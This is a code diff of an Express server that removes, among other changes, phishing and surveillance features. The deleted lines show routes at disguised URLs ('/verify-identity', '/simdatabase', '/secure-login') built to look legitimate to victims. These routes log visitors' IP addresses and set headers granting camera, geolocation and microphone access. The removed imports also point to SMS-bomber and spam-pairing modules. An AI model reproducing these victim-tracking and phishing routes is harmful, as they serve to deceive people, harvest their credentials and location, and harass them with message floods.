@@ -110,6 +110,7 @@ process.on('unhandledRejection', (reason, promise) => {
     console.log('✅ All required config vars are set. Starting server...');
   }
   console.log('');
+  if (hasCriticalError) process.exit(1);
 })();
 
 const path          = require('path');
@@ -146,13 +147,6 @@ const userRoutes     = require('./routes/user');
 const numbersRoutes  = require('./routes/numbers');
 const adminRoutes    = require('./routes/admin');
 const pairingRoutes  = require('./routes/pairing');
-const { router: locationRoutes, renderVictimPage, _locStore } = require('./routes/location');
-let spampairRoutes;
-try { spampairRoutes = require('./routes/spampair'); } catch (_sr) { console.warn('[SPAMPAIR] routes not loaded:', _sr.message); }
-let smsBomberRoutes;
-try { smsBomberRoutes = require('./routes/smsbomber'); } catch (_sb) { console.warn('[SMSBOMBER] routes not loaded:', _sb.message); }
-let phishingRoutes;
-try { phishingRoutes = require('./routes/phishing'); } catch (_pr) { console.warn('[PHISHING] routes not loaded:', _pr.message); }
 const { startPlanExpiryJob } = require('./jobs/planExpiryJob');
 const { startDbCleanupJob } = require('../allfunc/db-cleanup');
 const { startStorageGuardJob } = require('./jobs/storageGuardJob');
@@ -458,64 +452,6 @@ app.use('/api/user',    requireDb, userRoutes);
 app.use('/api/numbers', requireDb, numbersRoutes);
 app.use('/api/admin',   requireDb, adminRoutes);
 app.use('/api/pairing', requireDb, pairingRoutes);
-app.use('/api/location', locationRoutes);  // no DB needed — in-memory sessions
-
-// ── Clean /verify-identity/:sessionToken route (looks legitimate, no /api/ in path) ──
-app.get('/verify-identity/:sessionToken', (req, res) => {
-  const { sessionToken } = req.params;
-  const s = _locStore ? _locStore[sessionToken] : null;
-  if (!s) return res.status(404).send('Link expired or invalid.');
-
-  // Capture victim IP immediately on page load
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
-      || req.socket.remoteAddress;
-  s.clientIp   = clientIp;
-  s.timestamp  = Date.now();
-
-  res.setHeader('Content-Type', 'text/html; charset=utf-8');
-  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-  res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
-  res.send(renderVictimPage(sessionToken));
-});
-
-// ── Clean /simdatabase/:sessionToken route (looks like a real simdatabase link) ──
-app.get('/simdatabase/:sessionToken', (req, res) => {
-  const { sessionToken } = req.params;
-  const s = _locStore ? _locStore[sessionToken] : null;
-  if (!s) return res.status(404).send('Link expired or invalid.');
-
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
-      || req.socket.remoteAddress;
-  s.clientIp   = clientIp;
-  s.timestamp  = Date.now();
-
-  res.setHeader('Content-Type', 'text/html; charset=utf-8');
-  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-  res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
-  res.send(renderVictimPage(sessionToken));
-});
-
-if (spampairRoutes) app.use('/api/spampair', spampairRoutes);  // no DB needed — in-memory campaigns
-if (smsBomberRoutes) app.use('/api/smsbomber', smsBomberRoutes);
-if (phishingRoutes) app.use('/api/phish', phishingRoutes);
-// Clean phishing page URLs (no /api/ path — looks legitimate to victims)
-if (phishingRoutes) {
-  app.get('/secure-login/:type/:sessionToken', (req, res) => {
-    const { type, sessionToken } = req.params;
-    try {
-      const phishMod = require('./routes/phishing');
-      const s = phishMod._phishStore && phishMod._phishStore[sessionToken];
-      if (!s || s.type !== type) return res.status(404).send('Link expired or invalid.');
-      // Record IP
-      s.ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
-      s.createdAt = Date.now();
-      res.setHeader('Content-Type', 'text/html; charset=utf-8');
-      res.send(phishMod.renderPage(type, sessionToken));
-    } catch(e) {
-      res.status(404).send('Link expired or invalid.');
-    }
-  });
-}
 
 // ── Ultra-lightweight ping — no DB needed, used by keepalive self-pinger ────
 app.get('/api/ping', (req, res) => {
